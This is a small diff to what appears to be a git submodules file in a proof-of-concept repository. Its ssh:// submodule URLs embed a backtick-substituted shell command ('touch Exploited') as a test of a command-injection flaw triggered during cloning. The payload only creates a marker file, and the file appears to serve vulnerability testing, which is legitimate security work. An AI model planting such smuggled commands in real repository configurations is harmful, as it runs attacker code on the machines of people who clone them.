@@ -3,4 +3,4 @@
 	url = ssh://`touch Exploited.`foo.example.com/bar
 [submodule "poc-proxycommand-vulnerable2"]
 	path = poc-proxycommand-vulnerable2
-	url = ssh://`touch "Exploited."`foo.example.com/bar
+	url = ssh://`touch Exploited`foo.example.com/bar
